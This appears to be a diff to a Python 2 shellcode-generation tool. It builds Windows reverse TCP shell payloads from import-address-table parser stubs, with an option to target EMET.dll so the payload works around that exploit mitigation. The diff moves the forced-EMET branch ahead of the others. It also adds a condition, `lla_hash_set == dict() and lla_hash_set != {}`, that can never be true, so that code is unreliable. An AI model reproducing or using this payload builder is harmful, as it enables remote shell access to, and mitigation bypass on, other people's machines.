@@ -50,8 +50,7 @@ def find_apis(dll_set, os_system):
     #ignore_dlls = []
     #goodtogo = {}
     loaded_modules = set()
-    dll_set.add('emet.dll')
-    # add emet.dll
+    #dll_set.add('emet.dll')
     temp_set = dll_set
     if os_system.lower() == 'all':
         look_here = locations
@@ -226,7 +225,15 @@ def pack_ip_addresses(HOST):
 
 def decision_tree(HOST, PORT, dlls, lla_gpa_found, gpa_found, os_system, FORCE_EMET, USE_LOADED_MODULE):
     
-    if lla_gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
+    if FORCE_EMET.lower() == "true" and USE_LOADED_MODULE.lower() == 'false':
+            print "Forcing EMET.dll hash for use in IAT Loaded Module parser"
+            # pass the EMET.dll hash to the function
+            #shellcode = locate_hash1 + struct.pack("<I", 0xeb616ca5) + locate_hash2 + lla_gpa_parser + get_lla_gpa + shellcode5
+            #print shellcode
+            shellcode = loaded_iat_parser_stub(hash('EMET.dll')) + iat_rev_tcp_stub(HOST, PORT)
+            return shellcode
+    
+    elif lla_gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
         print '[*] Using LLA/GPA IAT parsing stub'
         shellcode =  iat_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
         return shellcode
@@ -236,20 +243,13 @@ def decision_tree(HOST, PORT, dlls, lla_gpa_found, gpa_found, os_system, FORCE_E
         shellcode = gpa_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
         return shellcode
 
-    elif FORCE_EMET.lower() == "true" and USE_LOADED_MODULE.lower() == 'false':
-            print "Forcing EMET.dll hash for use in IAT Loaded Module parser"
-            # pass the EMET.dll hash to the function
-            #shellcode = locate_hash1 + struct.pack("<I", 0xeb616ca5) + locate_hash2 + lla_gpa_parser + get_lla_gpa + shellcode5
-            #print shellcode
-            shellcode = loaded_iat_parser_stub(hash('EMET.dll')) + iat_rev_tcp_stub(HOST, PORT)
-            return shellcode
 
     else:
         
         lla_hash_set, gpa_hash_set = find_apis(dlls, os_system)
         
-        if lla_hash_set == dict():
-            print "[*] In lla_hash_set payload"
+        if lla_hash_set == dict() and lla_hash_set != {}:
+            print "[*] In lla_hash_set payload:", lla_hash_set
             DLL, a_hash = lla_hash_set.iteritems().next()
             print "[!] Using LLA/GPA DLL and hash", DLL, hex(a_hash)
             shellcode = loaded_iat_parser_stub(lla_hash_set.itervalues().next()) + iat_rev_tcp_stub(HOST, PORT)
